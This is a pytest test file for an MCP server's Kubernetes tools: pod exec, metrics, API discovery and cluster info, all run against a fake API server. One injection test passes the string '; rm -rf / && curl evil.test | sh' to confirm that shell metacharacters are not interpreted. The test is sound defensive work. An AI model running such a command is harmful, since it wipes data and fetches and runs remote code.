"""Exec, metrics, discovery and cluster info, over the real MCP protocol."""

from __future__ import annotations

from typing import Any

import pytest
from mcp import Client

from tests.conftest import call, call_raw, error_text
from tests.fake_apiserver import FakeCluster, FakeResource

pytestmark = pytest.mark.anyio


class TestExec:
    async def test_returns_stdout_and_a_zero_exit_code(
        self, mcp_client: Client, cluster: FakeCluster, pod_factory: Any
    ) -> None:
        cluster.add(pod_factory("web-0"))
        cluster.add_exec("default", "web-0", stdout="nameserver 10.96.0.10\n")

        result = await call(
            mcp_client, "exec_in_pod", name="web-0", command=["cat", "/etc/resolv.conf"]
        )
        assert result["stdout"] == "nameserver 10.96.0.10\n"
        assert result["exit_code"] == 0
        assert result["timed_out"] is False

    async def test_separates_stderr_from_stdout(
        self, mcp_client: Client, cluster: FakeCluster, pod_factory: Any
    ) -> None:
        # The library helper merges these; keeping them apart is the reason the
        # websocket is driven directly.
        cluster.add(pod_factory("web-0"))
        cluster.add_exec(
            "default", "web-0", stdout="out\n", stderr="warning: deprecated\n", exit_code=0
        )
        result = await call(mcp_client, "exec_in_pod", name="web-0", command=["sh", "-c", "x"])
        assert result["stdout"] == "out\n"
        assert result["stderr"] == "warning: deprecated\n"

    async def test_reports_a_non_zero_exit_code(
        self, mcp_client: Client, cluster: FakeCluster, pod_factory: Any
    ) -> None:
        # Without the error channel this would look like a successful command
        # that merely printed nothing.
        cluster.add(pod_factory("web-0"))
        cluster.add_exec("default", "web-0", stderr="no such file\n", exit_code=1)

        result = await call(mcp_client, "exec_in_pod", name="web-0", command=["cat", "/nope"])
        assert result["exit_code"] == 1
        assert "no such file" in result["stderr"]

    async def test_sends_argv_as_separate_parameters(
        self, mcp_client: Client, cluster: FakeCluster, pod_factory: Any
    ) -> None:
        # Each element must arrive as its own ?command= value. If argv were
        # flattened into one string, the runtime would exec a single oddly
        # named binary rather than a command with arguments.
        cluster.add(pod_factory("web-0"))
        cluster.add_exec("default", "web-0", stdout="ok\n")

        await call(
            mcp_client,
            "exec_in_pod",
            name="web-0",
            command=["sh", "-c", "echo hello; echo world"],
        )
        exec_request = [r for r in cluster.requests if r["path"].endswith("/exec")][-1]
        assert exec_request["command"] == ["sh", "-c", "echo hello; echo world"]

    async def test_shell_metacharacters_are_not_interpreted(
        self, mcp_client: Client, cluster: FakeCluster, pod_factory: Any
    ) -> None:
        # They travel as one opaque argv element; nothing splits or expands them.
        cluster.add(pod_factory("web-0"))
        cluster.add_exec("default", "web-0", stdout="")

        await call(
            mcp_client,
            "exec_in_pod",
            name="web-0",
            command=["echo", "; rm -rf / && curl evil.test | sh"],
        )
        exec_request = [r for r in cluster.requests if r["path"].endswith("/exec")][-1]
        assert exec_request["command"] == ["echo", "; rm -rf / && curl evil.test | sh"]

    async def test_passes_the_container(
        self, mcp_client: Client, cluster: FakeCluster, pod_factory: Any
    ) -> None:
        cluster.add(pod_factory("web-0"))
        cluster.add_exec("default", "web-0", stdout="ok\n")

        await call(mcp_client, "exec_in_pod", name="web-0", command=["ls"], container="sidecar")
        exec_request = [r for r in cluster.requests if r["path"].endswith("/exec")][-1]
        assert exec_request["query"]["container"] == "sidecar"

    async def test_times_out_but_keeps_partial_output(
        self, mcp_client: Client, cluster: FakeCluster, pod_factory: Any
    ) -> None:
        # A command that hangs after printing usually printed the useful part.
        cluster.add(pod_factory("web-0"))
        cluster.add_exec("default", "web-0", hang=True)

        result = await call(
            mcp_client,
            "exec_in_pod",
            name="web-0",
            command=["sleep", "600"],
            timeout_seconds=1,
        )
        assert result["timed_out"] is True
        assert "partial output" in result["stdout"]

    async def test_rejects_a_shell_string_and_explains(self, mcp_client: Client) -> None:
        result = await call_raw(mcp_client, "exec_in_pod", name="web-0", command="ls -la /app")
        assert result.is_error
        assert "sh" in error_text(result)

    @pytest.mark.parametrize(
        ("command", "because"),
        [
            ([], "empty argv"),
            ([""], "empty executable"),
            (["ls", 5], "non-string element"),
            (["x"] * 100, "too many arguments"),
        ],
    )
    async def test_rejects_invalid_argv(
        self, mcp_client: Client, command: object, because: str
    ) -> None:
        result = await call_raw(mcp_client, "exec_in_pod", name="web-0", command=command)
        assert result.is_error, f"expected {because} to be refused"


class TestMetrics:
    @pytest.fixture
    def cluster(self) -> FakeCluster:
        """A cluster that also serves metrics.k8s.io."""
        from tests.fake_apiserver import DEFAULT_RESOURCES

        return FakeCluster(
            [
                *DEFAULT_RESOURCES,
                FakeResource(
                    "PodMetrics",
                    "pods",
                    group="metrics.k8s.io",
                    version="v1beta1",
                    verbs=["get", "list"],
                ),
                FakeResource(
                    "NodeMetrics",
                    "nodes",
                    group="metrics.k8s.io",
                    version="v1beta1",
                    namespaced=False,
                    verbs=["get", "list"],
                ),
            ]
        )

    async def test_reports_pod_usage(self, mcp_client: Client, cluster: FakeCluster) -> None:
        cluster.add(
            {
                "apiVersion": "metrics.k8s.io/v1beta1",
                "kind": "PodMetrics",
                "metadata": {"name": "web-0", "namespace": "default"},
                "containers": [{"name": "app", "usage": {"cpu": "12m", "memory": "64Mi"}}],
            }
        )
        result = await call(mcp_client, "get_top_metrics", scope="pods")
        assert result["count"] == 1
        assert result["items"][0]["containers"][0]["cpu"] == "12m"

    async def test_reports_node_usage(self, mcp_client: Client, cluster: FakeCluster) -> None:
        cluster.add(
            {
                "apiVersion": "metrics.k8s.io/v1beta1",
                "kind": "NodeMetrics",
                "metadata": {"name": "node-1"},
                "usage": {"cpu": "250m", "memory": "1Gi"},
            }
        )
        result = await call(mcp_client, "get_top_metrics", scope="nodes")
        assert result["items"][0]["cpu"] == "250m"
        assert result["items"][0]["memory"] == "1Gi"


class TestMetricsUnavailable:
    """metrics-server is optional, so its absence must read as a fact about the
    cluster rather than as a malformed request."""

    async def test_explains_that_metrics_server_is_missing(self, mcp_client: Client) -> None:
        result = await call_raw(mcp_client, "get_top_metrics", scope="pods")
        assert result.is_error
        text = error_text(result)
        assert "metrics-server" in text
        assert "not installed" in text


class TestDiscovery:
    async def test_lists_what_the_cluster_serves(self, mcp_client: Client) -> None:
        result = await call(mcp_client, "list_api_resources")
        kinds = {item["kind"] for item in result["items"]}
        assert {"Pod", "Deployment", "Node", "ClusterHarness"} <= kinds

    async def test_reports_verbs_and_scope(self, mcp_client: Client) -> None:
        result = await call(mcp_client, "list_api_resources")
        by_kind = {item["kind"]: item for item in result["items"]}
        assert by_kind["Pod"]["namespaced"] is True
        assert by_kind["Node"]["namespaced"] is False
        assert "list" in by_kind["Pod"]["verbs"]

    async def test_reports_subresources(self, mcp_client: Client) -> None:
        result = await call(mcp_client, "list_api_resources")
        pod = next(item for item in result["items"] if item["kind"] == "Pod")
        assert "log" in pod["subresources"]
        assert "exec" in pod["subresources"]

    async def test_omits_bare_subresources_as_top_level_kinds(self, mcp_client: Client) -> None:
        result = await call(mcp_client, "list_api_resources")
        assert not [item for item in result["items"] if "/" in item["name"]]

    async def test_filters_by_group(self, mcp_client: Client) -> None:
        result = await call(mcp_client, "list_api_resources", group="apps")
        assert {item["kind"] for item in result["items"]} == {"Deployment", "StatefulSet"}

    async def test_filters_by_scope(self, mcp_client: Client) -> None:
        result = await call(mcp_client, "list_api_resources", namespaced=False)
        assert all(item["namespaced"] is False for item in result["items"])

    async def test_filters_by_verb(self, mcp_client: Client) -> None:
        result = await call(mcp_client, "list_api_resources", verb="delete")
        assert all("delete" in item["verbs"] for item in result["items"])

    async def test_survives_a_broken_api_group(
        self, mcp_client: Client, cluster: FakeCluster
    ) -> None:
        # An aggregated API whose backing service is down must cost that group,
        # not the whole listing.
        cluster.fail(
            "GET",
            "clusterharnesses",
            503,
            {"kind": "Status", "code": 503, "status": "Failure", "message": "service unavailable"},
        )
        result = await call(mcp_client, "list_api_resources")
        assert {"Pod", "Deployment"} <= {item["kind"] for item in result["items"]}


class TestClusterInfo:
    async def test_reports_version_and_node_health(
        self, mcp_client: Client, cluster: FakeCluster
    ) -> None:
        cluster.add(
            {
                "apiVersion": "v1",
                "kind": "Node",
                "metadata": {"name": "node-1"},
                "status": {"conditions": [{"type": "Ready", "status": "True"}]},
            }
        )
        cluster.add(
            {
                "apiVersion": "v1",
                "kind": "Node",
                "metadata": {"name": "node-2"},
                "status": {"conditions": [{"type": "Ready", "status": "False"}]},
            }
        )

        result = await call(mcp_client, "get_cluster_info")
        assert result["version"] == "v1.31.0"
        assert result["nodes_total"] == 2
        assert result["nodes_ready"] == 1
        assert result["nodes_not_ready"] == ["node-2"]
